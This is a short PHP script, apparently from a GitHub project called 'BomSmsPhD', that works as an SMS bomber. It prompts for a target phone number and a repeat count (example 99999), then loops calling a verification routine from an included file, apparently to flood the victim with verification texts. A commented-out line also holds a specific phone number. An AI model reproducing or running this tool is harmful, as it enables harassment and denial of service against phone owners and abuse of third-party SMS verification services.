<?php
include 'func.php';

/*
    https://github.com/nee48/BomSmsPhD
    Made by Handika Pratama
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor? (ex : 628xxxx)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah? (ex : 99999)\nInput : ";
$b = trim(fgets(STDIN));
//$init->no = "08561635203"; //Nomer Hp tujuan Pakai tanpa awalan 62 / 0. contoh 81xxxxxxx
$loop = "$b"; //Jumlah eksekusi
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}